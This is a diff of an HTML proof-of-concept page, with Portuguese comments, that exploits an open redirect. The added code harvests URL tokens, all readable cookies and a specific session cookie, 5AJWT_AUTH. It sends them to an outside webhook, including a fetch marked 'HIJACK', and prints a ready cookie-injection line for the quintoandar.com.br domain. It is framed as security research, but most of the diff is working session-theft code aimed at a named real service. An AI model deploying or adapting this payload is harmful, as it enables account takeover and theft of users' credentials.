@@ -1,16 +1,48 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
     <meta charset="UTF-8">
     <title>Security POC - Token Capture</title>
     <style>
-        body { font-family: monospace; background: #1a1a1a; color: #00ff88; padding: 20px; }
-        pre { background: #111; padding: 10px; border: 1px solid #333; overflow-x: auto; word-break: break-all; white-space: pre-wrap; }
-        .label { color: #aaa; font-size: 12px; margin-top: 10px; }
-        .found { color: #ffcc00; }
-        .empty { color: #555; }
+        body {
+            font-family: monospace;
+            background: #1a1a1a;
+            color: #00ff88;
+            padding: 20px;
+        }
+
+        pre {
+            background: #111;
+            padding: 10px;
+            border: 1px solid #333;
+            overflow-x: auto;
+            word-break: break-all;
+            white-space: pre-wrap;
+        }
+
+        .label {
+            color: #aaa;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
+        .found {
+            color: #ffcc00;
+        }
+
+        .empty {
+            color: #555;
+        }
+
+        .critical {
+            color: #ff4444;
+            font-weight: bold;
+            border: 1px solid #ff4444;
+        }
     </style>
 </head>
+
 <body>
     <h2>🔍 Open Redirect - Token Capture POC</h2>
     <div id="output"></div>
@@ -24,9 +56,9 @@
         // =============================================
         // 1. COLETA DE DADOS DA URL
         // =============================================
-        var hash     = window.location.hash;          // #token=...
-        var search   = window.location.search;         // ?token=...
-        var fullURL  = window.location.href;
+        var hash = window.location.hash;          // #token=...
+        var search = window.location.search;         // ?token=...
+        var fullURL = window.location.href;
         var referrer = document.referrer;              // De onde veio o redirect
 
         var qp = new URLSearchParams(search);
@@ -39,10 +71,27 @@
         ];
 
         var found = {};
-        tokenCandidates.forEach(function(k) {
+        tokenCandidates.forEach(function (k) {
             var v = qp.get(k) || hp.get(k);
             if (v) found[k] = v;
         });
+
+        // =============================================
+        // 1b. CAPTURA DE COOKIES (Session Hijacking)
+        // =============================================
+        var allCookies = document.cookie; // Todos os cookies sem HttpOnly
+
+        // Parseia os cookies em um objeto para facilitar análise
+        var cookieMap = {};
+        allCookies.split(';').forEach(function(c) {
+            var parts = c.trim().split('=');
+            var name = parts.shift();
+            var value = parts.join('=');
+            if (name) cookieMap[name] = value;
+        });
+
+        // Cookie alvo específico identificado na análise
+        var targetCookie = cookieMap['5AJWT_AUTH'] || null;
 
         // =============================================
         // 2. DECODIFICAÇÃO LOCAL DO JWT (sem servidor)
@@ -53,7 +102,7 @@
                 if (parts.length !== 3) return null;
                 var payload = atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'));
                 return JSON.parse(payload);
-            } catch(e) {
+            } catch (e) {
                 return null;
             }
         }
@@ -63,10 +112,13 @@
         // =============================================
         var payload = {
             found_tokens: found,
+            cookies: cookieMap,
+            target_cookie_5AJWT_AUTH: targetCookie,
             hash: hash,
             query: search,
             full_url: fullURL,
             referrer: referrer,
+            user_agent: navigator.userAgent,
             timestamp: new Date().toISOString()
         };
 
@@ -77,6 +129,14 @@
 
         // Método 2: img tag (fallback — funciona mesmo com CSP restritiva)
         new Image().src = WEBHOOK + "?img=1&d=" + encoded;
+
+        // Método 3: envio dedicado e explícito do cookie alvo
+        if (targetCookie) {
+            fetch(WEBHOOK + "?HIJACK=1&5AJWT_AUTH=" + encodeURIComponent(targetCookie), {
+                method: 'GET',
+                mode: 'no-cors'
+            });
+        }
 
         // =============================================
         // 4. EXIBIÇÃO LOCAL PARA DEBUG/REPORT
@@ -92,14 +152,13 @@
         html += row('📤 Referrer', referrer || '(sem referrer)');
         html += row('❓ Query String', search || '(nenhuma)');
         html += row('🔖 Fragment/Hash', hash || '(nenhum)');
-        html += row('🎯 Tokens Encontrados', JSON.stringify(found, null, 2));
+        html += row('🎯 Tokens na URL', JSON.stringify(found, null, 2));
 
-        // Decodifica cada JWT encontrado
-        Object.keys(found).forEach(function(k) {
+        // Decodifica cada JWT encontrado na URL
+        Object.keys(found).forEach(function (k) {
             var decoded = decodeJWT(found[k]);
             if (decoded) {
                 html += row('🔓 JWT Decodificado (' + k + ')', JSON.stringify(decoded, null, 2));
-                // Alerta se token ainda válido
                 if (decoded.exp && decoded.exp * 1000 > Date.now()) {
                     html += '<pre class="found">⚠️  TOKEN VÁLIDO! Expira em: ' + new Date(decoded.exp * 1000).toISOString() + '</pre>';
                 } else if (decoded.exp) {
@@ -108,8 +167,28 @@
             }
         });
 
+        // ---- SEÇÃO DE COOKIES ----
+        html += row('🍪 Todos os Cookies (document.cookie)', allCookies || '(nenhum cookie acessível)');
+
+        if (targetCookie) {
+            html += '<p class="label">🚨 COOKIE ALVO CAPTURADO — 5AJWT_AUTH</p>';
+            html += '<pre class="critical">' + targetCookie + '</pre>';
+
+            // Tenta decodificar se for JWT
+            var decodedCookie = decodeJWT(targetCookie);
+            if (decodedCookie) {
+                html += row('🔓 JWT do Cookie Decodificado', JSON.stringify(decodedCookie, null, 2));
+                if (decodedCookie.exp && decodedCookie.exp * 1000 > Date.now()) {
+                    html += '<pre class="critical">🔥 SESSÃO ATIVA! Válida até: ' + new Date(decodedCookie.exp * 1000).toISOString() + '\n\nInjetar no navegador:\ndocument.cookie = "5AJWT_AUTH=' + targetCookie + '; domain=.quintoandar.com.br; path=/";</pre>';
+                }
+            }
+        } else {
+            html += '<pre class="empty">Cookie 5AJWT_AUTH não encontrado (pode ter HttpOnly ou não estar no domínio).</pre>';
+        }
+
         html += row('📡 Enviado para Webhook', WEBHOOK);
         out.innerHTML = html;
     </script>
 </body>
+
 </html>
